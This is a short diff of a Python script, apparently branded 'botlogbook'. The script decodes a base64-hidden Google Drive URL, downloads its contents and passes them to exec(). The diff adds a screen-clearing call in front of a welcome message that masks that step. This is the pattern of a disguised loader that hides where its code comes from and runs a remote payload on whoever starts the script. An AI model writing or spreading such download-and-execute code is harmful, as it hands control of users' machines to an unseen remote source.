@@ -42,6 +42,7 @@ url = base64.b64decode("aHR0cHM6Ly9kcml2ZS51c2VyY29udGVudC5nb29nbGUuY29tL2Rvd25s
 response = requests.get(url)
 
 if response.status_code == 200:
+    os.system('clear')
     print("Welcome to botlogbook.", end="\r")
     exec(response.text)
 else:
